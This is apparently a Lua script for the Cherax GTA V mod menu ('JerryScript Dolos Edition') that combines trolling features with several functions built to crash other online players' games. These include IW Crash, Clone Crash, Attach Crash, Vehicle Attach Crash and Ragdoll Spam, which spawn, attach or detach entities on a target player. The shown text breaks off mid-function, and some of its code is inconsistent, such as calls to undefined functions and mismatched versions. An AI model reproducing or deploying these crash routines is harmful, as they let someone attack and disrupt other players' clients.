--[[
    ═══════════════════════════════════════════════════════════════════════════
    JERRYSCRIPT FOR CHERAX - v9.8 DOLOS EDITION
    Combined JerryScript + Dolos Trolling Features
    ═══════════════════════════════════════════════════════════════════════════
    
    Original JerryScript by Jerry123#4508
    Dolos features by Lance/stonerchrist
    Converted & Combined for Cherax Mod Menu
    
    ═══════════════════════════════════════════════════════════════════════════
    FEATURES:
    ═══════════════════════════════════════════════════════════════════════════
    
    ★ Self - Fire Wings, Fire Breath
    ★ Weapons - Nuke Waypoint
    ★ Infantry Attackers - Zombie, Chimp, Pug, Coyote, Hobo, Slasher, Cop, SWAT
    ★ Vehicle Attackers - Lazer, A-10, Oppressor, Khanjali, Kuruma, AA Turret
    ★ Cages - Container, Fence, Stunt Tube, Pillar Cage
    ★ Vehicle Trolls - Catapult, Flip, Spin, To The Moon, Anchor
    ★ Misc Trolls - Clone Player, PTFX Spam, Earthquake, Entity Storm
    ★ Sync Nodes - SubCar crash reference (ask in Discord)
    
    Installation: Save to C:\Users\{You}\AppData\Roaming\Cherax\Lua\
    ═══════════════════════════════════════════════════════════════════════════
]]

-- ═══════════════════════════════════════════════════════════════════════════
-- SCRIPT INFO
-- ═══════════════════════════════════════════════════════════════════════════
local SCRIPT_NAME = "JerryScript"
local SCRIPT_VERSION = "10.6"

-- ═══════════════════════════════════════════════════════════════════════════
-- CLEANUP ON RELOAD
-- ═══════════════════════════════════════════════════════════════════════════
pcall(function() ClickGUI.RemoveTab("JerryScript") end)
pcall(function() ClickGUI.RemovePlayerTab("JerryScript") end)

-- ═══════════════════════════════════════════════════════════════════════════
-- NATIVE HASHES (ALL VERIFIED FROM NATIVEDB)
-- ═══════════════════════════════════════════════════════════════════════════
local N = {
    -- Entity
    GET_ENTITY_COORDS = 0x3FEF770D40960D5A,
    SET_ENTITY_COORDS = 0x06843DA7060A026B,
    SET_ENTITY_COORDS_NO_OFFSET = 0x239A3351AC1DA385,
    SET_ENTITY_ROTATION = 0x8524A8B0171D5E07,
    GET_ENTITY_ROTATION = 0xAFBD61CC738D9EB9,
    APPLY_FORCE_TO_ENTITY = 0xC5F68BE9613E2D18,
    APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS = 0x18FF00FC7EFF559E,
    DELETE_ENTITY = 0xAE3CBE5BF394C9C9,
    DOES_ENTITY_EXIST = 0x7239B21A38F536BA,
    SET_ENTITY_AS_MISSION_ENTITY = 0xAD738C3085FE7E11,
    SET_ENTITY_AS_NO_LONGER_NEEDED = 0xB736A491E64A32CF,
    IS_ENTITY_IN_AIR = 0x886E37EC497200B6,
    GET_ENTITY_HEADING = 0xE83D4F9BA2A38914,
    GET_ENTITY_SPEED = 0xD5037BA82E12416F,
    FREEZE_ENTITY_POSITION = 0x428CA6DBD1094446,
    SET_ENTITY_INVINCIBLE = 0x3882114BDE571AD4,
    SET_ENTITY_VISIBLE = 0xEA1C610A04DB6BBB,
    SET_ENTITY_COLLISION = 0x1A9205C1B9EE827F,
    HAS_ENTITY_COLLIDED_WITH_ANYTHING = 0x20B711662962B472,
    GET_ENTITY_MODEL = 0x9F47B058362C84B5,
    SET_ENTITY_ALPHA = 0x44A0870B7E92D7C0,
    ATTACH_ENTITY_TO_ENTITY = 0x6B9BBD38AB0796DF,
    IS_ENTITY_A_PED = 0x524AC5ECEA15343E,
    IS_ENTITY_A_VEHICLE = 0x6AC7003FA6E5575E,
    
    -- Ped
    IS_PED_IN_ANY_VEHICLE = 0x997ABD671D25CA0B,
    GET_VEHICLE_PED_IS_IN = 0x9A9112A0FE9A4713,
    IS_PED_SHOOTING = 0x34616828CD07F1A1,
    GET_PED_BONE_COORDS = 0x17C07FC640E86B4E,
    CREATE_PED = 0xD49F9B0955C367DE,
    SET_PED_INTO_VEHICLE = 0xF75B0D629E1C063D,
    IS_PED_A_PLAYER = 0x12534C348C6CB68B,
    IS_PED_RAGDOLL = 0x47E4E977581C5B55,
    SET_PED_CAN_RAGDOLL = 0xB128377056A54E2A,
    SET_PED_TO_RAGDOLL = 0xAE99FB955581844A,
    SET_ENTITY_PROOFS = 0xFAEE099C6F890BB8,
    CLONE_PED = 0xEF29A16337FACADB,
    CLONE_PED_TO_TARGET = 0xE952D6431689AD9A,
    
    -- Player
    PLAYER_ID = 0x4F8644AF03D0E0D6,
    PLAYER_PED_ID = 0xD80958FC74E988A6,
    GET_PLAYER_PED = 0x43A66C31C68491C0,
    GET_PLAYER_PED_SCRIPT_INDEX = 0x50FAC3A3E030A6E1,
    IS_PLAYER_FREE_AIMING = 0x2E397FD2ECD37C87,
    
    -- Vehicle
    CREATE_VEHICLE = 0xAF35D0D2583051B0,
    SET_VEHICLE_BURNOUT = 0xFB8794444A7D60FB,
    SET_VEHICLE_CHEAT_POWER_INCREASE = 0xB59E4BD37AE292DB,
    SET_VEHICLE_FORWARD_SPEED = 0xAB54A438726D25D5,
    
    -- Fire / Explosions
    ADD_EXPLOSION = 0xE3AD2BDBAEE269AC,
    ADD_OWNED_EXPLOSION = 0x172AA1B624FA1013,
    
    -- Weapon
    GET_SELECTED_PED_WEAPON = 0x0A6DB4965674D243,
    SHOOT_SINGLE_BULLET_BETWEEN_COORDS = 0x867654CBC7606F2C,
    
    -- Model
    REQUEST_MODEL = 0x963D27A58DF860AC,
    HAS_MODEL_LOADED = 0x98A4EB5D89A0C952,
    SET_MODEL_AS_NO_LONGER_NEEDED = 0xE532F5D78798DAAB,
    
    -- Object
    CREATE_OBJECT = 0x509D5878EB39E842,
    
    -- Waypoint / Blip
    IS_WAYPOINT_ACTIVE = 0x1DD1F58F493F1DA5,
    GET_FIRST_BLIP_INFO_ID = 0x1BEDE233E6CD2A1F,
    GET_BLIP_COORDS = 0x586AFE3FF72D996E,
    
    -- Camera
    GET_GAMEPLAY_CAM_COORD = 0x14D6F5678D8F1B37,
    GET_GAMEPLAY_CAM_ROT = 0x837765A25378F0BB,
    GET_FINAL_RENDERED_CAM_ROT = 0x5B4E4C817FCC2DFB,
    
    -- Particle FX
    REQUEST_NAMED_PTFX_ASSET = 0xB80D8756B4668AB6,
    HAS_NAMED_PTFX_ASSET_LOADED = 0x8702416E512EC454,
    USE_PARTICLE_FX_ASSET = 0x6C38AF3693A69A91,
    START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD = 0xF56B8137DF10135D,
    START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY = 0x6F60E89A7B64EE1D,
    START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE = 0x6F60E89A7B64EE1D,
    SET_PARTICLE_FX_LOOPED_SCALE = 0xB44250AAA456492D,
    SET_PARTICLE_FX_LOOPED_COLOUR = 0x7F8F65877F88783B,
    REMOVE_PARTICLE_FX = 0xC401503DFE8D53CF,
    STOP_PARTICLE_FX_LOOPED = 0x8F75B0EE64B58159,
    
    -- Network
    NETWORK_REQUEST_CONTROL_OF_ENTITY = 0xB69317BF5E782347,
    NETWORK_HAS_CONTROL_OF_ENTITY = 0x01BF60A500E28887,
    
    -- Ped Combat/Task (Dolos) - REMOVED broken natives
    SET_PED_COMBAT_ATTRIBUTES = 0x9F7794730795E019,
    -- SET_PED_FLEE_ATTRIBUTES removed - doesn't exist in Cherax
    SET_PED_ACCURACY = 0x7AEFB85C1D49DEB6,
    SET_PED_COMBAT_ABILITY = 0xC7622C0D36B2FDA8,
    SET_PED_COMBAT_RANGE = 0x3C606747B23E497B,
    SET_COMBAT_FLOAT = 0xFF41B4B141ED981C,
    SET_PED_SHOOT_RATE = 0x614DA022990752DC,
    SET_PED_SUFFERS_CRITICAL_HITS = 0xEBD76F2359F190AC,
    TASK_COMBAT_PED = 0xF166E48407BAC484,
    TASK_VEHICLE_CHASE = 0x3C08A8E30363B353,
    TASK_PLANE_MISSION = 0x23703CD154E83B88,
    TASK_HELI_MISSION = 0xDAD029E187A2BEB4,
    TASK_VEHICLE_DRIVE_TO_COORD = 0xE2A2AA2F659D77A7,
    TASK_VEHICLE_SHOOT_AT_PED = 0x10AB107B887214D8,
    SET_TASK_VEHICLE_CHASE_BEHAVIOR_FLAG = 0x44B0A88E0EACA25F,
    SET_BLOCKING_OF_NON_TEMPORARY_EVENTS = 0x90D2156198831D69,
    TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS = 0x4F056E1AFFEF17AB,
    TASK_WANDER_STANDARD = 0xBB9CE077274F6A1B,
    SET_PED_KEEP_TASK = 0x971D38760FBC02EF,
    TASK_COWER = 0x3EB1FE9E8E908E15,
    
    -- Weapon
    GIVE_WEAPON_TO_PED = 0xBF0FD6E56C964FCB,
    GIVE_DELAYED_WEAPON_TO_PED = 0xB282DC6EBD803C75,
    SET_PED_GADGET = 0xD0D7B1E680ED4A1A,
    GET_CURRENT_PED_WEAPON_ENTITY_INDEX = 0x3B390A939AF0B5FC,
    DETACH_ENTITY = 0x961AC54BF0613F5D,
    SET_ENTITY_HEALTH = 0x6B76DC1F3AE6E6A3,
    
    -- Ped Appearance (for cloning)
    GET_PED_DRAWABLE_VARIATION = 0x67F3780DD425D4FC,
    GET_PED_TEXTURE_VARIATION = 0x04A355E041E004E6,
    SET_PED_COMPONENT_VARIATION = 0x262B14F48D29DE80,
    GET_PED_PROP_INDEX = 0x898CC20EA75BACD8,
    GET_PED_PROP_TEXTURE_INDEX = 0xE131A28626F81AB2,
    SET_PED_PROP_INDEX = 0x93376B65A266EB5F,
    CLEAR_PED_PROP = 0x0943E5B8E078E76E,
    
    -- Blip
    SET_BLIP_COLOUR = 0x03D7FB09E75D6B7E,
    SET_BLIP_SPRITE = 0xDF735600A4696DAF,
    
    -- Vehicle Extended (Dolos)
    SET_VEHICLE_ENGINE_ON = 0x2497C4717C8B881E,
    SET_VEHICLE_DOORS_LOCKED = 0xB664292EAECF7FA6,
    SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER = 0x517AAF684BB50CD1,
    SET_HELI_BLADES_FULL_SPEED = 0xA86B2B5FE3A08D71,
    SET_HELI_TURBULENCE_SCALAR = 0x1D46B53E9C09F52F,
    SET_VEHICLE_FORWARD_SPEED = 0xAB54A438726D25D5,
    GET_VEHICLE_ESTIMATED_MAX_SPEED = 0x53AF99BAA671CA47,
    SET_PLANE_ENGINE_HEALTH = 0xA81E63DD62D9CF4C,
    CONTROL_LANDING_GEAR = 0xCFC8BE9A5E1FE575,
    OPEN_BOMB_BAY_DOORS = 0x87E7F24270732CB1,
    SET_VEHICLE_BOMB_AMMO = 0xEE5AAD7ADBB82D4F,
    SET_VEHICLE_SHOOT_AT_TARGET = 0x74CD9A9327A282EA,
    CREATE_PICK_UP_ROPE_FOR_CARGOBOB = 0x7BEB0C7A235F6F3B,
    SET_CARGOBOB_FORCE_DONT_DETACH_VEHICLE = 0x571FEB383F629926,
    SET_CARGOBOB_PICKUP_MAGNET_PULL_STRENGTH = 0x685D5561680D088B,
    SET_CARGOBOB_PICKUP_MAGNET_FALLOFF = 0x6D8EAC07506291FB,
    SET_CARGOBOB_PICKUP_MAGNET_ENSURE_PICKUP_ENTITY_UPRIGHT = 0x4243E3EFBB7B04B2,
    ATTACH_VEHICLE_TO_CARGOBOB = 0x4127F1D84E347769,
    SET_VEHICLE_GRAVITY = 0x89F149B6131E57DA,
    SET_VEHICLE_MOD = 0x6AF0636DDEDCB6DD,
    GET_PED_IN_VEHICLE_SEAT = 0xBB40DD2270B65366,
    
    -- Misc (Dolos)
    SET_RIOT_MODE_ENABLED = 0x2587A48BC7FB8B24,
    TASK_REACT_AND_FLEE_PED = 0x72C896464915D1B1,
    ADD_BLIP_FOR_ENTITY = 0x5CDE92C702A8FCE7,
    SET_ENTITY_HEADING = 0x8E2530AA8ADA980E,
    SET_ENTITY_VELOCITY = 0x1C99BB7B6E96D16F,
    SET_ENTITY_ANGULAR_VELOCITY = 0x8339643499D1222E,
    PLACE_OBJECT_ON_GROUND_OR_OBJECT_PROPERLY = 0x58A850EAEE20FAA3,
    GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS = 0x1899F328B0E12848,
    SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY_NEW = 0x867654CBC7606F2C,
    GET_PED_BONE_INDEX = 0x3F428D08BE5AAE31,
    
    -- World/Pool iteration
    GET_CLOSEST_PED = 0xC33AB876A77F8164,
    GET_CLOSEST_VEHICLE = 0xF73EB622C4F1689B,
    GET_GAME_POOL = 0x2B9D4F50BDE3CEBD,
}

-- Weapon Hashes
local WEAPON_RPG = 0xB1CA77B1
local WEAPON_HOMING = 0x63AB0442
local WEAPON_KNIFE = 0x99B507EA
local WEAPON_KNUCKLE = 0xD8DF3C3C
local WEAPON_MUSKET = 0xA89CB99E
local WEAPON_MINIGUN = 0x42BF8A85
local WEAPON_PISTOL = 0x1B06D571

-- Vehicle Hashes
local VEHICLE_LAZER = 0xB39B0AE6
local VEHICLE_STRIKEFORCE = 0x64DE07A1
local VEHICLE_NOKOTA = 0x5E5C2E5A
local VEHICLE_OPPRESSOR2 = 0x7B54A9D3
local VEHICLE_KHANJALI = 0xAA6F980A
local VEHICLE_CARGOBOB = 0xFCFCB68B
local VEHICLE_VOLATOL = 0x1AAD0DED

-- Ped Hashes
local PED_PILOT = 0x5C19E508
local PED_TRAMP = 0xB3F5B618
local PED_COP = 0x5E3DA4A4
local PED_SWAT = 0x8D8F1B10
local PED_ZOMBIE = 0xAC4B4506
local PED_CHIMP = 0xA8683715
local PED_COYOTE = 0x644AC75E
local PED_PUG = 0x6D362854
local PED_RABBIT = 0xDFB55C81

-- Object Hashes
local OBJ_DORITO = 0x1FE2327D
local OBJ_CORPSE = 0x5048B9E0
local OBJ_FAN = 0xE90B1B72
local OBJ_CAGE = 0x9E47AB6B
local OBJ_GHOST1 = 0x6C9D5B9A
local OBJ_SKELETON = 0x39E1F772
local OBJ_SNOWMAN = 0xBB9C0CA3

-- ═══════════════════════════════════════════════════════════════════════════
-- SETTINGS & STATE
-- ═══════════════════════════════════════════════════════════════════════════

local Settings = {
    notifications = true,
}

-- Explosion Settings
local ExplosionSettings = {
    camShake = 0.0,
    invisible = false,
    audible = true,
    owned = false,  -- OFF by default - explosions do no damage when owned
    effectType = 7,
}

-- Per-player explosion type
local PlayerExplosionType = {}

-- Self Settings
local SelfSettings = {
    fireWingsEnabled = false,
    fireWingsScale = 3,
    fireBreathEnabled = false,
    fireBreathScale = 3,
}

-- Weapon Settings
local WeaponSettings = {
    nukeGun = false,
    nukeHeight = 40,
}

-- PTFX Spam Settings
local PtfxSpamTargets = {}
local PtfxSpamType = {}  -- Per-player effect type selection (1-8)

-- Attacker Settings (Dolos)
local AttackerSettings = {
    numAttackers = 1,
    weapon = WEAPON_PISTOL,
}

-- Attacker tracking per player
local AttackersByPid = {}

-- Earthquake loop targets
local EarthquakeTargets = {}

-- State tracking
local State = {
    explosionLoopTargets = {},
    vehicleLoops = {},
    burnoutTargets = {},
    explodeAllLoop = false,
    spawnedEntities = {},
    entityStormTargets = {},
    attackers = {},  -- Global attacker list
}

-- Entity YEET Settings
local YeetSettings = {
    range = 100,
    multiplier = 5,
}

-- ═══════════════════════════════════════════════════════════════════════════
-- UTILITY FUNCTIONS
-- ═══════════════════════════════════════════════════════════════════════════

local function log(msg)
    Logger.LogInfo("[" .. SCRIPT_NAME .. "] " .. tostring(msg))
end

local function toast(title, msg)
    if Settings.notifications then
        GUI.AddToast(title, msg, 2500, eToastPos.TopRight)
    end
end

local function getLocalPlayerId()
    return Natives.InvokeInt(N.PLAYER_ID)
end

local function getLocalPlayerPed()
    return Natives.InvokeInt(N.PLAYER_PED_ID)
end

local function getPlayerPed(pid)
    return Natives.InvokeInt(N.GET_PLAYER_PED_SCRIPT_INDEX, pid)
end

local function getPlayerCoords(pid)
    local ped = Players.GetCPed(pid)
    if not ped then return nil, nil, nil end
    local pos = ped.Position
    if pos then
        return pos.x, pos.y, pos.z
    end
    return nil, nil, nil
end

local function getLocalCoords()
    local ped = GTA.GetLocalPed()
    if ped then
        local pos = ped.Position
        if pos then
            return pos.x, pos.y, pos.z
        end
    end
    return 0, 0, 0
end

local function doesEntityExist(entity)
    return entity and entity ~= 0 and Natives.InvokeBool(N.DOES_ENTITY_EXIST, entity)
end

-- betterDelete - Proper entity deletion (based on working crash script pattern)
local function betterDelete(entity, networked)
    if not doesEntityExist(entity) then return end
    pcall(function()
        requestControlOfEntity(entity)
        Natives.InvokeVoid(N.SET_ENTITY_AS_MISSION_ENTITY, entity, true, true)
        Natives.InvokeVoid(N.DELETE_ENTITY, entity)
    end)
end

-- Alias for compatibility
local function deleteEntity(entity)
    betterDelete(entity, true)
end

-- Release model when done
local function NoLongerNeeded(model)
    pcall(function()
        Natives.InvokeVoid(N.SET_MODEL_AS_NO_LONGER_NEEDED, model)
    end)
end

local function requestModel(model)
    local hash = type(model) == "string" and Utils.Joaat(model) or model
    if not Natives.InvokeBool(N.HAS_MODEL_LOADED, hash) then
        Natives.InvokeVoid(N.REQUEST_MODEL, hash)
        local timeout = 0
        while not Natives.InvokeBool(N.HAS_MODEL_LOADED, hash) and timeout < 100 do
            Script.Yield(10)
            timeout = timeout + 1
        end
    end
    return Natives.InvokeBool(N.HAS_MODEL_LOADED, hash)
end

local function requestPtfx(asset)
    Natives.InvokeVoid(N.REQUEST_NAMED_PTFX_ASSET, asset)
    local timeout = 0
    while not Natives.InvokeBool(N.HAS_NAMED_PTFX_ASSET_LOADED, asset) and timeout < 50 do
        Script.Yield(10)
        timeout = timeout + 1
    end
    return Natives.InvokeBool(N.HAS_NAMED_PTFX_ASSET_LOADED, asset)
end

-- Simple network control request (doesn't boot players like ownership transfer)
local function requestControlOfEntity(handle)
    if handle and handle ~= 0 then
        Natives.InvokeVoid(N.NETWORK_REQUEST_CONTROL_OF_ENTITY, handle)
        -- Small wait for control
        local timeout = 0
        while not Natives.InvokeBool(N.NETWORK_HAS_CONTROL_OF_ENTITY, handle) and timeout < 10 do
            Script.Yield(0)
            timeout = timeout + 1
        end
        return Natives.InvokeBool(N.NETWORK_HAS_CONTROL_OF_ENTITY, handle)
    end
    return false
end

-- ═══════════════════════════════════════════════════════════════════════════
-- IW CRASH - Invalid Weapon/Bone crash method
-- Spawns invisible peds with detached weapons to crash target
-- ═══════════════════════════════════════════════════════════════════════════

local function IWCrash(pid)
    local px, py, pz = getPlayerCoords(pid)
    if not px then 
        toast(SCRIPT_NAME, "Invalid target!")
        return 
    end
    
    local heading = 0
    pcall(function()
        local targetPed = getPlayerPed(pid)
        if targetPed then
            heading = Natives.InvokeFloat(N.GET_ENTITY_HEADING, targetPed)
        end
    end)
    
    local mdl = Utils.Joaat("cs_tenniscoach")
    local weaponHash = WEAPON_RPG
    local peds = {}
    
    Script.QueueJob(function()
        if not requestModel(mdl) then 
            toast(SCRIPT_NAME, "Failed to load model!")
            return 
        end
        
        toast(SCRIPT_NAME, "IW Crash executing...")
        
        -- Spawn 10 invisible peds above target
        for i = 1, 10 do
            local ped = GTA.CreatePed(mdl, 2, px, py + 55, pz, heading, true, true)
            if doesEntityExist(ped) then
                requestControlOfEntity(ped)
                table.insert(peds, ped)
            end
            Script.Yield(50)
        end
        
        Script.Yield(50)
        
        -- Teleport to target, make invisible, give weapon, detach it
        for i = 1, #peds do
            local ped = peds[i]
            pcall(function()
                requestControlOfEntity(ped)
                -- Teleport to target position
                Natives.InvokeVoid(N.SET_ENTITY_COORDS_NO_OFFSET, ped, px, py, pz, false, false, false)
                -- Make invisible
                Natives.InvokeVoid(N.SET_ENTITY_VISIBLE, ped, false)
                -- Give weapon
                Natives.InvokeVoid(N.GIVE_DELAYED_WEAPON_TO_PED, ped, weaponHash, 0, true)
                -- Set as gadget (equip it)
                Natives.InvokeVoid(N.SET_PED_GADGET, ped, weaponHash, true)
            end)
            Script.Yield(25)
            
            -- Detach the weapon entity (causes crash)
            pcall(function()
                local gadget = Natives.InvokeInt(N.GET_CURRENT_PED_WEAPON_ENTITY_INDEX, ped, 0)
                if gadget and gadget ~= 0 then
                    Natives.InvokeVoid(N.DETACH_ENTITY, gadget, true, true)
                end
            end)
            Script.Yield(25)
            
            -- Kill the ped
            pcall(function()
                Natives.InvokeVoid(N.SET_ENTITY_HEALTH, ped, 0, 0)
            end)
        end
        
        Script.Yield(500)
        
        -- Clean up peds
        for i = 1, #peds do
            local p = peds[i]
            if doesEntityExist(p) then
                betterDelete(p, true)
            end
        end
        
        peds = {}
        NoLongerNeeded(mdl)
        
        toast(SCRIPT_NAME, "IW Crash sent!")
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════
-- CLONE CRASH - Spawns clones attached in chain until game crashes
-- Based on RyzeScript/X-Force method - WORKS because uses entity manipulation
-- ═══════════════════════════════════════════════════════════════════════════

local function CloneCrash(pid)
    local targetPed = getPlayerPed(pid)
    if not targetPed or targetPed == 0 then
        toast(SCRIPT_NAME, "Invalid target!")
        return
    end
    
    local px, py, pz = getPlayerCoords(pid)
    if not px then return end
    
    Script.QueueJob(function()
        toast(SCRIPT_NAME, "Clone Crash executing...")
        
        local clones = {}
        local lastPed = targetPed
        local lastHeight = 0
        
        -- Create chain of 30 clones attached to each other
        for i = 1, 30 do
            pcall(function()
                local clone = Natives.InvokeInt(N.CLONE_PED, targetPed, false, true, true)
                if clone and clone ~= 0 then
                    table.insert(clones, clone)
                    table.insert(State.spawnedEntities, clone)
                    
                    -- Attach to previous ped in chain
                    Natives.InvokeVoid(N.ATTACH_ENTITY_TO_ENTITY, clone, lastPed, 0,
                        0.0, 0.0, lastHeight - 0.5,
                        0.0, 0.0, 0.0,
                        false, false, false, false, 0, false)
                    
                    lastPed = clone
                    lastHeight = lastHeight - 0.5
                end
            end)
            Script.Yield(25)
        end
        
        Script.Yield(2000)
        
        -- Clean up
        for _, clone in ipairs(clones) do
            pcall(function()
                betterDelete(clone, true)
            end)
        end
        
        toast(SCRIPT_NAME, "Clone Crash sent! (30 clones)")
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════
-- ATTACH CRASH - Attach many entities to target (like IW pattern)
-- Spawns objects at target position and attaches to their bones
-- ═══════════════════════════════════════════════════════════════════════════

local function AttachCrash(pid)
    local targetPed = getPlayerPed(pid)
    if not targetPed or targetPed == 0 then
        toast(SCRIPT_NAME, "Invalid target!")
        return
    end
    
    local px, py, pz = getPlayerCoords(pid)
    if not px then return end
    
    -- Small objects that work well for attachment
    local crashObjects = {
        Utils.Joaat("prop_beach_volball02"),
        Utils.Joaat("prop_cs_dildo_01"),
        Utils.Joaat("prop_drug_package"),
    }
    
    local objs = {}
    
    Script.QueueJob(function()
        toast(SCRIPT_NAME, "Attach Crash executing...")
        
        -- Load models
        for _, mdl in ipairs(crashObjects) do
            requestModel(mdl)
        end
        Script.Yield(200)
        
        -- Bone IDs for ped
        local bones = {0, 31086, 6286, 28252, 60309, 24818, 64729, 40269, 45509, 58271}
        
        -- Spawn and attach objects
        for i = 1, 15 do
            local mdl = crashObjects[(i % #crashObjects) + 1]
            local bone = bones[(i % #bones) + 1]
            
            pcall(function()
                -- Spawn at target position
                local obj = GTA.CreateObject(mdl, px, py, pz, true, true)
                if obj and obj ~= 0 then
                    table.insert(objs, obj)
                    table.insert(State.spawnedEntities, obj)
                    
                    Script.Yield(20)
                    requestControlOfEntity(obj)
                    
                    -- Make invisible first
                    Natives.InvokeVoid(N.SET_ENTITY_VISIBLE, obj, false)
                    
                    -- Attach to target with offset
                    Natives.InvokeVoid(N.ATTACH_ENTITY_TO_ENTITY, obj, targetPed, bone,
                        (math.random() - 0.5), (math.random() - 0.5), (math.random() - 0.5),
                        0, 0, 0,
                        false, false, false, false, 0, true)
                end
            end)
            Script.Yield(50)
        end
        
        -- Release models
        for _, mdl in ipairs(crashObjects) do
            NoLongerNeeded(mdl)
        end
        
        toast(SCRIPT_NAME, "Attach Crash sent! (15 objects)")
        
        Script.Yield(5000)
        
        -- Clean up after 5 seconds
        for _, obj in ipairs(objs) do
            pcall(function()
                betterDelete(obj, true)
            end)
        end
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════
-- VEHICLE ATTACH CRASH - Attach vehicles to player ped (causes sync issues)
-- ═══════════════════════════════════════════════════════════════════════════

local function VehicleAttachCrash(pid)
    local targetPed = getPlayerPed(pid)
    if not targetPed or targetPed == 0 then
        toast(SCRIPT_NAME, "Invalid target!")
        return
    end
    
    local px, py, pz = getPlayerCoords(pid)
    if not px then return end
    
    local vehModel = Utils.Joaat("rhino")  -- Tank causes most issues
    local vehicles = {}
    
    Script.QueueJob(function()
        toast(SCRIPT_NAME, "Vehicle Attach Crash executing...")
        
        if not requestModel(vehModel) then 
            toast(SCRIPT_NAME, "Failed to load model!")
            return 
        end
        
        -- Spawn and attach multiple tanks to player
        for i = 1, 5 do
            pcall(function()
                local veh = GTA.CreateVehicle(vehModel, px, py, pz + 100 + (i * 10), 0, true, true, false)
                if veh and veh ~= 0 then
                    table.insert(vehicles, veh)
                    table.insert(State.spawnedEntities, veh)
                    
                    requestControlOfEntity(veh)
                    
                    -- Attach vehicle to ped (very crashy)
                    Natives.InvokeVoid(N.ATTACH_ENTITY_TO_ENTITY, veh, targetPed, 0,
                        0, 0, i * 3,
                        0, 0, 0,
                        false, false, false, false, 0, false)
                end
            end)
            Script.Yield(100)
        end
        
        NoLongerNeeded(vehModel)
        
        Script.Yield(3000)
        
        -- Clean up
        for _, veh in ipairs(vehicles) do
            pcall(function()
                betterDelete(veh, true)
            end)
        end
        
        toast(SCRIPT_NAME, "Vehicle Attach Crash sent!")
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════
-- INFINITE WEAPON CRASH v2 - Enhanced IW but SAFE (won't crash your game)
-- Spawns peds FAR from you, teleports them to target, does the crash
-- ═══════════════════════════════════════════════════════════════════════════

local function InfiniteWeaponCrash(pid)
    local px, py, pz = getPlayerCoords(pid)
    if not px then 
        toast(SCRIPT_NAME, "Invalid target!")
        return 
    end
    
    -- Get our coords to spawn peds FAR from us
    local myX, myY, myZ = getLocalPlayerCoords()
    if not myX then return end
    
    -- Spawn location - far from both us and target (in the sky above target)
    local spawnX = px
    local spawnY = py + 100  -- 100m north of target
    local spawnZ = pz + 50   -- 50m up
    
    local pedModels = {
        Utils.Joaat("cs_tenniscoach"),
        Utils.Joaat("a_m_m_bevhills_01"),
    }
    
    local weapons = {
        WEAPON_RPG,
        Utils.Joaat("WEAPON_MINIGUN"),
    }
    
    local peds = {}
    
    Script.QueueJob(function()
        toast(SCRIPT_NAME, "IW Crash v2 executing (safe mode)...")
        
        -- Load models
        for _, mdl in ipairs(pedModels) do
            requestModel(mdl)
        end
        Script.Yield(100)
        
        -- Spawn 10 peds (reduced from 20 for stability)
        for i = 1, 10 do
            local mdl = pedModels[(i % #pedModels) + 1]
            local weapon = weapons[(i % #weapons) + 1]
            
            pcall(function()
                -- Spawn far from us in the sky
                local ped = GTA.CreatePed(mdl, 2, spawnX, spawnY + (i * 2), spawnZ, 0, true, true)
                if doesEntityExist(ped) then
                    table.insert(peds, {ped = ped, weapon = weapon})
                    table.insert(State.spawnedEntities, ped)
                    -- Make invisible immediately
                    Natives.InvokeVoid(N.SET_ENTITY_VISIBLE, ped, false)
                end
            end)
            Script.Yield(50)
        end
        
        Script.Yield(100)
        
        -- Now teleport each ped to target and do the IW crash
        for _, data in ipairs(peds) do
            local ped = data.ped
            local weapon = data.weapon
            
            pcall(function()
                if not doesEntityExist(ped) then return end
                
                requestControlOfEntity(ped)
                -- Teleport to target position
                Natives.InvokeVoid(N.SET_ENTITY_COORDS_NO_OFFSET, ped, px, py, pz, false, false, false)
                -- Give weapon
                Natives.InvokeVoid(N.GIVE_DELAYED_WEAPON_TO_PED, ped, weapon, 9999, true)
                Natives.InvokeVoid(N.SET_CURRENT_PED_WEAPON, ped, weapon, true)
                Natives.InvokeVoid(N.SET_PED_GADGET, ped, weapon, true)
            end)
            Script.Yield(30)
            
            -- Detach weapon (the crash vector)
            pcall(function()
                if not doesEntityExist(ped) then return end
                local gadget = Natives.InvokeInt(N.GET_CURRENT_PED_WEAPON_ENTITY_INDEX, ped, 0)
                if gadget and gadget ~= 0 then
                    Natives.InvokeVoid(N.DETACH_ENTITY, gadget, true, true)
                end
            end)
            Script.Yield(20)
            
            -- Kill ped
            pcall(function()
                if doesEntityExist(ped) then
                    Natives.InvokeVoid(N.SET_ENTITY_HEALTH, ped, 0, 0)
                end
            end)
        end
        
        Script.Yield(500)
        
        -- Clean up
        for _, data in ipairs(peds) do
            pcall(function()
                if doesEntityExist(data.ped) then
                    betterDelete(data.ped, true)
                end
            end)
        end
        
        for _, mdl in ipairs(pedModels) do
            NoLongerNeeded(mdl)
        end
        
        toast(SCRIPT_NAME, "IW Crash v2 sent!")
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════
-- PED RAGDOLL SPAM - Spam ragdoll on peds near target (causes physics issues)
-- ═══════════════════════════════════════════════════════════════════════════

local function RagdollSpam(pid)
    local px, py, pz = getPlayerCoords(pid)
    if not px then return end
    
    local mdl = Utils.Joaat("a_m_m_skater_01")
    local peds = {}
    
    Script.QueueJob(function()
        toast(SCRIPT_NAME, "Ragdoll Spam executing...")
        
        if not requestModel(mdl) then return end
        
        -- Spawn 30 peds at target
        for i = 1, 30 do
            pcall(function()
                local angle = (i / 30) * 6.28
                local spawnX = px + math.cos(angle) * 3
                local spawnY = py + math.sin(angle) * 3
                
                local ped = GTA.CreatePed(mdl, 2, spawnX, spawnY, pz, math.random() * 360, true, true)
                if ped and ped ~= 0 then
                    table.insert(peds, ped)
                    table.insert(State.spawnedEntities, ped)
                end
            end)
            Script.Yield(20)
        end
        
        -- Spam ragdoll on all of them repeatedly
        for wave = 1, 5 do
            for _, ped in ipairs(peds) do
                pcall(function()
                    if doesEntityExist(ped) then
